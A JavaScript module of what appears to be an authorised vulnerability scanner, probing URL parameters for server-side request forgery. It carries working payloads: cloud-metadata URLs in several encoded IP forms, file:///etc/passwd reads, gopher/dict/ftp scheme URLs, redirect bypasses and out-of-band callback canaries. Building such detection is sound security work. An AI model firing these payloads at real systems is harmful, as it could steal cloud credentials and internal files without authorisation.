// Dark Matter rule-based scanner — SSRF probe (v1).
// Hunts URL-fetching parameters and tests cloud-metadata exfiltration.
//
// CONFIRMATION RULE (9 Nov 2026, Zerodha FP fix): a finding confirms
// ONLY on content actually FETCHED from the metadata URL — a value or
// document shape that only a metadata response contains (an AMI /
// instance id value, IMDS credential JSON, a role name, or the
// metadata listing itself). The payload URL reflected in the page is
// NOT fetch proof: the URL itself carries "meta-data" as a path
// segment, so a bare-word match ("meta-data", "ami-id",
// "instance-id") fires on any page that echoes its own query string
// — exactly the Zerodha false positive. The response is stripped of
// every reflection of the sent URL (raw and percent-encoded) before
// matching, and a match that only existed inside the echoed request
// URL is never confirmation.
//
// BLIND LEG (14 Nov 2026, coverage rows #237 [High] + #311 — the same
// concept filed twice): a fetch that happens but returns nothing to
// the attacker can never confirm under the metadata oracle — that is
// the definition of blind SSRF. The blind leg sends a collaborator
// canary URL as the param value (opts.oobCallback + opts.oobWaitFor,
// the same collaborator seam sqli-oob and xxe use) and confirms ONLY
// when the canary listener records a hit for the probe token AND a
// never-advertised control token records NO hit.
//
// CONTROL DESIGN — DELIBERATE DEVIATION FROM THE ssrfReferer.js
// LEG-1 COPY (live evidence, 14 Nov 2026): ssrfReferer sends its
// control canary the same way as its probe (as a Referer) and relies
// on a per-page-cache assumption — its own tests model the target as
// "a link preview cached per page — only the first canary Referer is
// fetched". That assumption has NO param equivalent: a server that
// fetches a URL param fetches EVERY value it is given, probe and
// control alike. A throwaway live check proved it — a mock target
// that fetches any ?url= value and returns nothing caused BOTH the
// probe and the control token to hit, so the literal copy REJECTS a
// genuinely vulnerable fetcher (false negative by design). The blind
// leg therefore sends ONLY the probe canary: the control token is
// waited on but NEVER appears in any request, so a hit for it can
// only mean the listener records hits the probe did not cause (a
// noisy/broken listener) — the probe hit is unattributable and the
// leg rejects. The probe token is fresh-random per run and was
// advertised only in the probe request, so its hit already attributes
// the fetch to the probe. This keeps the two-token differential the
// fix plan asked for, without the false negative.
// The leg is LAB-GATED: it runs only when the target host is listed
// in opts.labTargets, and the wiring starts the collaborator only
// for lab-gated scans — a non-lab target never receives a callback
// URL. Without the collaborator seam the leg is skipped, never
// guessed at. The blind leg is capped at the first 2 URL-shaped
// params (the sqli-oob global-cap discipline) and is skipped on a
// param the metadata leg already confirmed — that param is already
// proven fetchable, and the blind leg adds nothing there.
//
// BYPASS LEGS (14 Nov 2026, coverage rows #306/#308/#309/#310):
// the metadata leg above proves the fetcher reaches ONE address in
// ONE form. The four legs below prove the bypass families the
// checklist files separately — each with its own differential, and
// each confirming ONLY on fetched content or a tap hit, never on
// reflection or error text:
//   #306 internal-service probing — the param value is a canary URL
//     on the scanner's own collaborator (an internal bridge-gateway
//     address, 172.17.0.1); confirms ONLY when the collaborator's
//     distinctive DTD-fragment body comes back in the response.
//     LAB-GATED (the collaborator only starts for lab targets).
//   #308 redirect bypass — the param value is a collaborator URL
//     that 302s to the metadata URL; confirms ONLY on fetched
//     metadata content in the response (same oracle as the metadata
//     leg). LAB-GATED.
//   #309 alternate IP forms — the metadata address sent as hex,
//     decimal, octal, IPv6 and percent-encoded forms; confirms ONLY
//     on fetched metadata content per form (same oracle).
//   #310 non-HTTP schemes — file:// confirms ONLY on /etc/passwd
//     content in the response; gopher://, dict:// and ftp:// confirm
//     ONLY on a raw-TCP scheme-tap hit for the probe token with no
//     hit for a never-advertised control token. The tap legs are
//     LAB-GATED (the tap only starts for lab targets).
// The new legs run on the first TWO URL params only (the metadata
// leg keeps its five): the lab-gated legs start listeners and wait
// on taps, so the request/wait budget is capped per scan target.
// Listeners are probe-owned: started when a lab-gated leg needs
// them, stopped in a finally — no listener outlives the probe call.
// Every new finding class contains 'ssrf', so differential.js
// routes it to the ssrf protocol, judged on evidence.oobHit.
import { randomBytes } from 'node:crypto';
import { mutateUrl, probePointName, probePointParameter, noteAttemptedPoints } from '../probePoints.js';
import { isLabTargetHost } from '../../labCreds.js';
import { createOobCollaborator } from '../oobCollaborator.js';
import { createSchemeTap } from '../schemeTap.js';
const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const URL_PARAM_RE = /^(url|uri|image|img|src|source|fetch|feed|redirect|next|callback|webhook)$/i;
// How long the blind leg waits for the canary hit (the target fetches
// asynchronously, so the window must cover a slow fetcher) and how
// long the control token gets to prove its absence — same values as
// ssrfReferer.js leg 1.
const BLIND_PROBE_WAIT_MS = 5000;
const BLIND_CONTROL_WAIT_MS = 1000;
// The blind leg tries at most this many URL-shaped params per scan
// target (sqli-oob global-cap discipline: each param costs a
// probe wait + a control wait).
const BLIND_PARAM_CAP = 2;

const METADATA_URL = 'http://169.254.169.254/latest/meta-data/';
const BENIGN_CONTROL_URL = 'https://example.com/';
const FILE_PASSWD_URL = 'file:///etc/passwd';
const FILE_BENIGN_URL = 'file:///etc/hostname';
// The collaborator answers every canary fetch with this DTD fragment;
// the fragment is the internal-service body the #306 leg looks for.
export const COLLAB_FRAGMENT_MARKER = 'dm-oob-hit';
// New legs run on the first two URL params only (see header).
const NEW_LEG_PARAM_CAP = 2;
// How long the scheme-tap legs wait for the probe token / the control
// token (ssrfReferer.js uses 5000/1000 for the same reason: the
// target fetches asynchronously). Overridable via opts for tests.
const TAP_PROBE_WAIT_MS = 5000;
const TAP_CONTROL_WAIT_MS = 1000;

// Markers a fetched IMDS document contains that the payload URL
// itself never does. All are VALUE-shaped (an id, a JSON field, a
// role name) — bare words such as "meta-data" or "ami-id" are
// deliberately absent from this list: they appear in docs, error
// pages and the reflected request URL.
const FETCHED_VALUE_MARKERS = [
  /ami-[0-9a-f]{8,17}/i,
  /instance-id.{0,120}?i-[0-9a-f]{8,17}/is,
  /"instanceId"\s*:\s*"i-[0-9a-f]{8,17}"/i,
  /"AccessKeyId"\s*:\s*"A[A-Z0-9]{15,20}"/,
  /security-credentials\/[A-Za-z0-9._=-]+/i,
];

// Field names of the /latest/meta-data/ listing document. A single
// field name proves nothing (docs list them too); two or more as
// whole lines is the listing itself, echoed by a server-side fetch.
const METADATA_LISTING_FIELDS = [
  'ami-id',
  'ami-launch-index',
  'ami-manifest-path',
  'instance-id',
  'instance-type',
  'local-ipv4',
  'public-ipv4',
  'public-hostname',
  'placement',
  'security-credentials',
  'iam',
];

// Strip every reflection of the sent URL from the body before
// matching: the raw URL, its percent-encoded form, and the bare
// metadata URL in both forms. A match that only existed inside the
// echoed request URL is not fetch proof.
export function stripReflectedUrl(body, sentUrl) {
  let out = String(body || '');
  for (const variant of [
    sentUrl,
    sentUrl ? encodeURIComponent(sentUrl) : '',
    METADATA_URL,
    encodeURIComponent(METADATA_URL),
  ]) {
    if (variant) out = out.split(variant).join('');
  }
  return out;
}

// The fetched-metadata proof in a response body, or null. Matches
// only after reflections of the sent URL are stripped: either a
// value-shaped marker (an id, credential JSON, role name) or at
// least two listing fields as whole lines.
export function fetchedMetadataMarker(body, sentUrl) {
  const clean = stripReflectedUrl(body, sentUrl);
  for (const re of FETCHED_VALUE_MARKERS) {
    const m = clean.match(re);
    if (m) return { marker: m[0], clean };
  }
  const lines = new Set(
    clean
      .split(/\r?\n/)
      .map((l) => l.trim().toLowerCase())
      .filter(Boolean)
  );
  const fieldHits = METADATA_LISTING_FIELDS.filter((f) => lines.has(f));
  // Quote the first listing field in evidence; the window around it
  // shows the listing itself.
  if (fieldHits.length >= 2) return { marker: fieldHits[0], clean };
  return null;
}

// ---- pure helpers for the bypass legs (exported for unit tests) -----------

// Alternate forms of the IMDS address (row #309). Each form must
// resolve to 169.254.169.254 on a fetcher that normalises it:
// hex 0xA9.0xFE.0xA9.0xFE, decimal 2852039166, octal
// 0251.0376.0251.0376, IPv6 ::ffff:a9fe:a9fe / ::ffff:169.254.169.254,
// and percent-encoded dotted digits. Pure.
export function alternateIpForms() {
  return [
    { name: 'hex', url: 'http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/' },
    { name: 'decimal', url: 'http://2852039166/latest/meta-data/' },
    { name: 'octal', url: 'http://0251.0376.0251.0376/latest/meta-data/' },
    { name: 'ipv6-hex', url: 'http://[::ffff:a9fe:a9fe]/latest/meta-data/' },
    { name: 'ipv6-dotted', url: 'http://[::ffff:169.254.169.254]/latest/meta-data/' },
    { name: 'pct-encoded', url: 'http://%31%36%39.254.169.254/latest/meta-data/' },
  ];
}

// Judge a fetched-content leg (#308 redirect, #309 alternate IP,
// #310 file): confirmed only when the marker appears on the probe
// input and never on the benign control. Pure.
export function assessFetchedContent({ probeMarker, benignMarker }) {
  if (benignMarker) {
    return { verdict: 'rejected', reason: 'benign control also returned the marker — the leak is not input-correlated' };
  }
  if (!probeMarker) {
    return { verdict: 'rejected', reason: 'no fetched-content marker on the probe input' };
  }
  return { verdict: 'confirmed', reason: 'fetched content appears on the probe input and never on the benign control' };
}

// Judge the #306 internal-service leg: confirmed only when the
// collaborator fragment came back on the probe input and never on
// the benign control. Pure.
export function assessInternalFetch({ probeHasFragment, benignHasFragment }) {
  if (benignHasFragment) {
    return { verdict: 'rejected', reason: 'benign control also returned the collaborator fragment' };
  }
  if (!probeHasFragment) {
    return { verdict: 'rejected', reason: 'the internal canary body never came back' };
  }
  return { verdict: 'confirmed', reason: 'the internal service body came back on the probe input and never on the benign control' };
}

// Judge a scheme-tap leg (#310 gopher/dict/ftp): confirmed only when
// the probe token arrived at the tap and the never-advertised
// control token did not — the ssrfReferer.js leg-1 model. Pure.
export function assessSchemeTap({ probeHit, controlHit }) {
  if (probeHit && !controlHit) {
    return { verdict: 'confirmed', reason: 'tap recorded the probe token and nothing for the control token' };
  }
  if (!probeHit) {
    return { verdict: 'rejected', reason: 'no tap hit arrived for the probe token — the server did not speak the scheme to the tap' };
  }
  return {
    verdict: 'rejected',
    reason: 'control token was also recorded — the tap records hits the probe did not cause',
  };
}

// The /etc/passwd proof in a response body, or null: a root line
// (root:x:0:0:) after reflections of the sent URL are stripped.
// A bare "root" or the file:// URL itself is never proof. Pure.
export function passwdMarker(body, sentUrl) {
  let clean = String(body || '');
  for (const variant of [sentUrl, sentUrl ? encodeURIComponent(sentUrl) : '']) {
    if (variant) clean = clean.split(variant).join('');
  }
  const m = clean.match(/^root:[^:]*:0:0:/m);
  return m ? { marker: m[0], clean } : null;
}

// The three scheme-tap URLs for one token (row #310): the gopher
// selector is the token, the dict word is the token, the ftp
// username is the token — so the tap can attribute the bytes it
// receives to the probe (or the control). Pure.
export function schemeTapUrls(hostPort, token) {
  return {
    gopher: `gopher://${hostPort}/${token}`,
    dict: `dict://${hostPort}/d:${token}`,
    ftp: `ftp://${token}@${hostPort}/`,
  };
}

// The redirector URL for the #308 leg: the collaborator base plus
// /redir/<urlencoded-target>. Pure.
export function redirectorUrl(base, target) {
  return `${String(base).replace(/\/+$/, '')}/redir/${encodeURIComponent(target)}`;
}

function rand() {
  return randomBytes(4).toString('hex');
}

// Strip reflections of one sent URL (raw + percent-encoded) from a body.
function stripSent(body, sentUrl) {
  let out = String(body || '');
  for (const variant of [sentUrl, sentUrl ? encodeURIComponent(sentUrl) : '']) {
    if (variant) out = out.split(variant).join('');
  }
  return out;
}

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

function windowAround(clean, marker) {
  const idx = clean.indexOf(marker);
  return clean.slice(Math.max(0, idx - 60), idx + 120);
}


export function ssrfBlindCanaryUrl(base, token) {
  return `${String(base).replace(/\/+$/, '')}/${token}`;
}

/**
 * Judge the blind leg: confirmed only when the probe token's canary
 * was hit and the never-advertised control token's was not. Pure.
 * (The control token is never sent to the target — it is waited on
 * only — so a hit for it means the listener records hits the probe
 * did not cause.)
 */
export function assessBlindSsrf({ probeHit, controlHit }) {
  if (probeHit && !controlHit) {
    return {
      verdict: 'confirmed',
      reason: 'canary hit arrived for the probe URL and none for the never-advertised control token',
    };
  }
  if (!probeHit) {
    return { verdict: 'rejected', reason: 'no canary hit arrived for the probe URL — the server did not fetch it' };
  }
  return {
    verdict: 'rejected',
    reason: 'a hit arrived for the never-advertised control token — the listener records hits the probe did not cause',
  };
}

export async function probeSsrf(url, params, opts = {}) {
  const findings = [];
  const candidates = params.filter((p) => URL_PARAM_RE.test(probePointName(p)));
  noteAttemptedPoints(opts, candidates.slice(0, 5));
  const diag = opts && typeof opts.diagnostics === 'object' && opts.diagnostics ? opts.diagnostics : null;
  const setDiag = (k, v) => {
    if (diag) diag[k] = v;
  };

  // ---- Leg 0 — cloud metadata (unchanged) ----------------------------------
  const metadataConfirmed = new Set();
  for (const param of candidates.slice(0, 5)) {
    const sentUrl = mutateUrl(url, param, METADATA_URL);
    let body;
    try {
      body = await get(sentUrl, opts);
    } catch {
      continue;
    }
    const hit = fetchedMetadataMarker(body, sentUrl);
    if (hit) {
      const window = windowAround(hit.clean, hit.marker);
      metadataConfirmed.add(probePointName(param));
      findings.push({
        class: 'ssrf',
        id: `ssrf-metadata-${probePointName(param)}`,
        title: `SSRF in parameter '${probePointParameter(param)}' — cloud metadata reachable`,
        severity: 'critical',
        url,
        param: probePointParameter(param),
        evidence: {
          request: `GET ${sentUrl}`,
          response: `cloud metadata marker in the response — "...${window}..."`,
          impact_demo: 'the server-side fetcher reached 169.254.169.254',
          oobHit: true,
        },
      });
    }
  }

  // ---- Blind leg — collaborator canary + control (rows #237 / #311) ------
  // Needs the collaborator seam; without it the leg is skipped,
  // never guessed at. Lab-gated twice: the wiring starts the
  // collaborator only for lab hosts, and the probe re-checks
  // opts.labTargets before sending anything.
  const oobCallback = typeof opts.oobCallback === 'string' && opts.oobCallback ? opts.oobCallback : null;
  const oobWaitFor = typeof opts.oobWaitFor === 'function' ? opts.oobWaitFor : null;
  // The blind leg is a SKIPPED leg, never an early return: legs 1-5
  // below must still run (the alternate-IP/file legs are not lab-gated).
  const blindReady =
    Boolean(oobCallback) && Boolean(oobWaitFor) && isLabTargetHost(url, opts.labTargets);
  if (!oobCallback || !oobWaitFor) {
    setDiag('blindVerdict', 'skipped-no-collaborator');
  } else if (!isLabTargetHost(url, opts.labTargets)) {
    setDiag('blindVerdict', 'skipped-non-lab');
  }
  if (blindReady) {
    let blindTried = 0;
    let blindConfirmed = false;
    for (const param of candidates.slice(0, BLIND_PARAM_CAP)) {
      // A param the metadata leg already confirmed is proven
      // fetchable — the blind leg adds nothing there.
      if (metadataConfirmed.has(probePointName(param))) continue;
      const probeToken = `dmssrf-${rand()}`;
      const controlToken = `dmssrf-ctrl-${rand()}`;
      const probeCanary = ssrfBlindCanaryUrl(oobCallback, probeToken);
      blindTried += 1;
      // Only the probe canary is ever sent: a server that fetches a
      // URL param fetches every value it is given, so sending the
      // control canary the same way would make a genuinely vulnerable
      // target hit it too and the leg would reject it (see header).
      let sent = false;
      try {
        await get(mutateUrl(url, param, probeCanary), opts);
        sent = true;
      } catch {
        sent = false;
      }
      let probeHit = false;
      if (sent) {
        try {
          probeHit = Boolean(await oobWaitFor(probeToken, BLIND_PROBE_WAIT_MS));
        } catch {
          probeHit = false;
        }
      }
      // The control token is NEVER sent to the target — it is waited
      // on only, so a hit for it proves the listener records hits the
      // probe did not cause (a noisy/broken listener).
      let controlHit = false;
      try {
        controlHit = Boolean(await oobWaitFor(controlToken, BLIND_CONTROL_WAIT_MS));
      } catch {
        controlHit = false;
      }
      setDiag('blindProbeHit', probeHit);
      setDiag('blindControlHit', controlHit);
      const judged = assessBlindSsrf({ probeHit, controlHit });
      if (judged.verdict === 'confirmed') {
        blindConfirmed = true;
        findings.push({
          class: 'ssrf_blind',
          id: `ssrf-blind-${probePointName(param)}`,
          title: `Blind SSRF in parameter '${probePointParameter(param)}' — server fetched the collaborator URL without returning content`,
          severity: 'high',
          url,
          param: probePointParameter(param),
          evidence: {
            request: `GET ${mutateUrl(url, param, probeCanary)} (control token ${controlToken} never sent; no hit recorded for it)`,
            response: `The canary listener recorded a hit for the probe URL token and none for the control token — the server issued a request to the attacker-supplied URL and returned nothing. ${judged.reason}.`,
            impact_demo: 'An attacker-controlled URL becomes a server-side request with no response needed: internal-service probing and cloud-metadata reads through a blind fetch.',
            signalCorrelated: true,
            oobHit: true,
          },
        });
      }
    }
    setDiag('blindParamsTried', blindTried);
    setDiag('blindVerdict', blindConfirmed ? 'confirmed' : 'rejected');
  }

  // ---- Leg 1 — #309 alternate IP forms -------------------------------------
  // Same oracle as the metadata leg, one finding per form that
  // returns fetched metadata. The benign control runs first per
  // param: a metadata leak on the benign input is not a bypass.
  for (const param of candidates.slice(0, NEW_LEG_PARAM_CAP)) {
    const benignSent = mutateUrl(url, param, BENIGN_CONTROL_URL);
    let benignBody = '';
    try {
      benignBody = await get(benignSent, opts);
    } catch {
      benignBody = '';
    }
    const benignHit = fetchedMetadataMarker(benignBody, benignSent);
    if (benignHit) {
      setDiag('altIpControlContaminated', true);
      continue;
    }
    for (const form of alternateIpForms()) {
      const sentUrl = mutateUrl(url, param, form.url);
      let body;
      try {
        body = await get(sentUrl, opts);
      } catch {
        continue;
      }
      const hit = fetchedMetadataMarker(body, sentUrl);
      const judged = assessFetchedContent({ probeMarker: hit ? hit.marker : null, benignMarker: null });
      if (judged.verdict === 'confirmed') {
        const window = windowAround(hit.clean, hit.marker);
        findings.push({
          class: 'ssrf_alt_ip',
          id: `ssrf-alt-ip-${form.name}-${probePointName(param)}`,
          title: `SSRF in parameter '${probePointParameter(param)}' — metadata reachable via alternate IP form (${form.name})`,
          severity: 'high',
          url,
          param: probePointParameter(param),
          evidence: {
            request: `GET ${sentUrl}`,
            response: `cloud metadata marker in the response — "...${window}..."`,
            impact_demo: `the server-side fetcher normalised the ${form.name} form (${form.url}) to 169.254.169.254 and fetched it`,
            oobHit: true,
          },
        });
      }
    }
  }

  // ---- Leg 2 — #310 file:// -------------------------------------------------
  // Confirm ONLY on /etc/passwd content in the response. The benign
  // control fetches a harmless file: if it also returns passwd
  // content, the marker is not input-correlated and the leg skips.
  for (const param of candidates.slice(0, NEW_LEG_PARAM_CAP)) {
    const benignSent = mutateUrl(url, param, FILE_BENIGN_URL);
    let benignBody = '';
    try {
      benignBody = await get(benignSent, opts);
    } catch {
      benignBody = '';
    }
    const benignHit = passwdMarker(benignBody, benignSent);
    if (benignHit) {
      setDiag('fileControlContaminated', true);
      continue;
    }
    const sentUrl = mutateUrl(url, param, FILE_PASSWD_URL);
    let body;
    try {
      body = await get(sentUrl, opts);
    } catch {
      continue;
    }
    const hit = passwdMarker(body, sentUrl);
    const judged = assessFetchedContent({ probeMarker: hit ? hit.marker : null, benignMarker: null });
    if (judged.verdict === 'confirmed') {
      const window = windowAround(hit.clean, hit.marker);
      findings.push({
        class: 'ssrf_file',
        id: `ssrf-file-${probePointName(param)}`,
        title: `SSRF in parameter '${probePointParameter(param)}' — local file read via file://`,
        severity: 'high',
        url,
        param: probePointParameter(param),
        evidence: {
          request: `GET ${sentUrl}`,
          response: `/etc/passwd content in the response — "...${window}..."`,
          impact_demo: 'the server-side fetcher read a local file through a file:// URL',
          oobHit: true,
        },
      });
    }
  }

  // ---- Lab-gated legs (#306, #308, #310 gopher/dict/ftp) -------------------
  // The listeners below only ever start for a lab target: a non-lab
  // target never receives a collaborator or tap URL. The probe
  // re-checks isLabTargetHost itself (the sqli-oob pattern) — the
  // battery passes opts.labTargets in from index.js.
  const labGated = isLabTargetHost(url, opts.labTargets);
  setDiag('labGated', labGated);
  if (!labGated || candidates.length === 0) return findings;

  let collab = null;
  let tap = null;
  try {
    collab = createOobCollaborator({
      listenHost: opts.oobListenHost || process.env.DM_OOB_LISTEN_HOST || '0.0.0.0',
      listenPort: opts.oobListenPort || (process.env.DM_OOB_PORT ? Number(process.env.DM_OOB_PORT) : 0),
      callbackHost: opts.oobCallbackHost || process.env.DM_OOB_CALLBACK_HOST || '172.17.0.1',
    });
    await collab.start();
  } catch {
    collab = null;
  }
  try {
    tap = createSchemeTap({
      listenHost: opts.oobListenHost || process.env.DM_OOB_LISTEN_HOST || '0.0.0.0',
      listenPort: opts.schemeTapListenPort || 0,
      callbackHost: opts.oobCallbackHost || process.env.DM_OOB_CALLBACK_HOST || '172.17.0.1',
    });
    await tap.start();
  } catch {
    tap = null;
  }
  try {
    // ---- Leg 3 — #306 internal-service probing ---------------------------
    // The param value is a canary URL on the collaborator — an
    // internal bridge-gateway address. Confirm ONLY when the
    // collaborator's DTD-fragment body comes back in the response
    // (and never on the benign control). A fetcher that fetches
    // but does not echo stays quiet: no content, no finding.
    if (collab && collab.baseUrl()) {
      for (const param of candidates.slice(0, NEW_LEG_PARAM_CAP)) {
        const token = `dmssrf-${rand()}`;
        const sentUrl = mutateUrl(url, param, `${collab.baseUrl()}/${token}`);
        let probeBody = '';
        try {
          probeBody = await get(sentUrl, opts);
        } catch {
          continue;
        }
        const probeHas = stripSent(probeBody, sentUrl).includes(COLLAB_FRAGMENT_MARKER);
        const benignSent = mutateUrl(url, param, BENIGN_CONTROL_URL);
        let benignBody = '';
        try {
          benignBody = await get(benignSent, opts);
        } catch {
          benignBody = '';
        }
        const benignHas = stripSent(benignBody, benignSent).includes(COLLAB_FRAGMENT_MARKER);
        const judged = assessInternalFetch({ probeHasFragment: probeHas, benignHasFragment: benignHas });
        setDiag('internalVerdict', judged.verdict);
        if (judged.verdict === 'confirmed') {
          const clean = stripSent(probeBody, sentUrl);
          const window = windowAround(clean, COLLAB_FRAGMENT_MARKER);
          findings.push({
            class: 'ssrf_internal',
            id: `ssrf-internal-${probePointName(param)}`,
            title: `SSRF in parameter '${probePointParameter(param)}' — internal service reachable`,
            severity: 'high',
            url,
            param: probePointParameter(param),
            evidence: {
              request: `GET ${sentUrl}`,
              response: `internal service body in the response — "...${window}..."`,
              impact_demo: 'the server-side fetcher reached an internal address (docker bridge gateway) and returned the service body',
              oobHit: true,
            },
          });
        }
      }

      // ---- Leg 4 — #308 redirect bypass ----------------------------------
      // The param value is a collaborator URL that 302s to the
      // metadata URL (or the opts.redirectTarget test seam). Confirm
      // ONLY on fetched metadata content in the response — the
      // redirect itself is never confirmation. The benign control
      // redirects to a harmless page instead.
      const redirectTarget =
        typeof opts.redirectTarget === 'string' && opts.redirectTarget ? opts.redirectTarget : METADATA_URL;
      const redirectBenignTarget =
        typeof opts.redirectBenignTarget === 'string' && opts.redirectBenignTarget
          ? opts.redirectBenignTarget
          : BENIGN_CONTROL_URL;
      for (const param of candidates.slice(0, NEW_LEG_PARAM_CAP)) {
        const sentUrl = mutateUrl(url, param, redirectorUrl(collab.baseUrl(), redirectTarget));
        let probeBody = '';
        try {
          probeBody = await get(sentUrl, opts);
        } catch {
          continue;
        }
        const probeHit = fetchedMetadataMarker(probeBody, sentUrl);
        const benignSent = mutateUrl(url, param, redirectorUrl(collab.baseUrl(), redirectBenignTarget));
        let benignBody = '';
        try {
          benignBody = await get(benignSent, opts);
        } catch {
          benignBody = '';
        }
        const benignHit = fetchedMetadataMarker(benignBody, benignSent);
        const judged = assessFetchedContent({
          probeMarker: probeHit ? probeHit.marker : null,
          benignMarker: benignHit ? benignHit.marker : null,
        });
        setDiag('redirectVerdict', judged.verdict);
        if (judged.verdict === 'confirmed') {
          const window = windowAround(probeHit.clean, probeHit.marker);
          findings.push({
            class: 'ssrf_redirect',
            id: `ssrf-redirect-${probePointName(param)}`,
            title: `SSRF in parameter '${probePointParameter(param)}' — metadata reachable via redirect bypass`,
            severity: 'high',
            url,
            param: probePointParameter(param),
            evidence: {
              request: `GET ${sentUrl}`,
              response: `cloud metadata marker in the response — "...${window}..."`,
              impact_demo: 'the server-side fetcher followed a redirect from a validated URL to 169.254.169.254 and fetched it',
              oobHit: true,
            },
          });
        }
      }
    } else {
      setDiag('collaboratorSkipped', true);
    }

    // ---- Leg 5 — #310 gopher / dict / ftp (scheme tap) --------------------
    // The param value is a scheme URL pointing at the raw-TCP tap;
    // the token rides in the gopher selector, the dict word, or the
    // ftp username. Confirm ONLY on a tap hit for the probe token
    // with no hit for a never-advertised control token (the
    // ssrfReferer.js leg-1 model). The response body is never
    // evidence for these legs.
    if (tap && tap.hostPort()) {
      const tapWaitMs = typeof opts.tapWaitMs === 'number' ? opts.tapWaitMs : TAP_PROBE_WAIT_MS;
      const tapControlWaitMs =
        typeof opts.tapControlWaitMs === 'number' ? opts.tapControlWaitMs : TAP_CONTROL_WAIT_MS;
      for (const param of candidates.slice(0, NEW_LEG_PARAM_CAP)) {
        for (const scheme of ['gopher', 'dict', 'ftp']) {
          const token = `dmssrf-${scheme}-${rand()}`;
          const controlToken = `dmssrf-${scheme}-ctrl-${rand()}`;
          const urls = schemeTapUrls(tap.hostPort(), token);
          const sentUrl = mutateUrl(url, param, urls[scheme]);
          try {
            await get(sentUrl, opts);
          } catch {
            // The fetch failing does not prove the scheme was not
            // spoken — the tap is the oracle, not the response.
          }
          let probeHit = null;
          try {
            probeHit = await tap.waitFor(token, tapWaitMs);
          } catch {
            probeHit = null;
          }
          let controlHit = null;
          try {
            controlHit = await tap.waitFor(controlToken, tapControlWaitMs);
          } catch {
            controlHit = null;
          }
          const judged = assessSchemeTap({ probeHit: Boolean(probeHit), controlHit: Boolean(controlHit) });
          setDiag(`schemeTap${scheme}Verdict`, judged.verdict);
          if (judged.verdict === 'confirmed') {
            findings.push({
              class: `ssrf_${scheme}`,
              id: `ssrf-${scheme}-${probePointName(param)}`,
              title: `SSRF in parameter '${probePointParameter(param)}' — ${scheme.toUpperCase()} fetch to an internal address`,
              severity: 'high',
              url,
              param: probePointParameter(param),
              evidence: {
                request: `GET ${sentUrl}`,
                response: `the scheme tap recorded a ${scheme} request carrying the probe token "${token}" and nothing for the never-advertised control token — the server-side fetcher spoke ${scheme} to an internal address`,
                impact_demo: `the server-side fetcher issues ${scheme} requests to attacker-chosen internal addresses`,
                oobHit: true,
              },
            });
          }
        }
      }
    } else {
      setDiag('schemeTapSkipped', true);
    }
  } finally {
    if (collab) {
      try {
        await collab.stop();
      } catch {
        /* ignore */
      }
    }
    if (tap) {
      try {
        await tap.stop();
      } catch {
        /* ignore */
      }
    }
  }
  return findings;
}
